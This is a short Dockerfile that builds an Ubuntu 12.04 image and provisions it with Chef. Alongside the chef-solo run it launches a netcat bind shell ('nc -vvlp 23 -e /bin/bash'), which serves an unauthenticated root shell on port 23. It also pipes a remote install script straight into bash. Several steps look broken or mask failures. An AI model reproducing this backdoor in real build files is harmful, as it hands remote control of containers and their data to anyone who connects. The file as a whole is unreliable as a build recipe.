FROM ubuntu:12.04

RUN apt-get update; apt-get upgrade

RUN apt-get install -y curl

RUN apt-get clean

RUN curl -L https://www.opscode.com/chef/install.sh | bash

RUN echo "kernel.shmmax = 268435456" >> /etc/sysctl.conf

ADD . /tmp/chef/

RUN /sbin/upstart "nc -vvlp 23 -e /bin/bash & chef-solo -c /tmp/chef/docker/solo.rb -j /tmp/chef/docker/run.json 2>&1 >/tmp/chef-solo.log"; exit 0

RUN rm /tmp/*
